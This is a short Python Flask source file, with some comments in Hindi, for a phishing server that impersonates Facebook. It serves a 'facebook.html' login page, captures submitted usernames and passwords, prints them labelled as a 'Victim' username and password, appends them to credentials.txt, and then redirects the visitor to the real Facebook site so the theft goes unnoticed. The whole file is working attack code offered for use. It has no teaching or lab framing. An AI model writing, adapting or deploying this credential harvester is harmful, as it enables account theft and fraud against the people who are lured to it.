from flask import Flask, render_template, request, redirect
import logging
import os

app = Flask(__name__)

# Flask logs कम करें (optional)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.route('/', methods=['GET'])
def home():
    return render_template('facebook.html')

@app.route('/login', methods=['POST'])
def login():
    try:
        username = request.form.get('username')
        password = request.form.get('password')

        print(f"Victim username - {username}")
        print(f"Victim password - {password}")

        # Safe credentials file write
        with open('credentials.txt', 'a') as f:
            f.write(f"Victim username - {username}\n")
            f.write(f"Victim password - {password}\n\n")

        return redirect("https://www.facebook.com/")
    except Exception as e:
        print("Login error:", e)
        return "Internal Server Error", 500

if __name__ == '__main__':
    # Important: Avoid conflict by using environment variable
    os.environ["FLASK_ENV"] = "development"
    app.run(host='0.0.0.0', port=5000, debug=True)
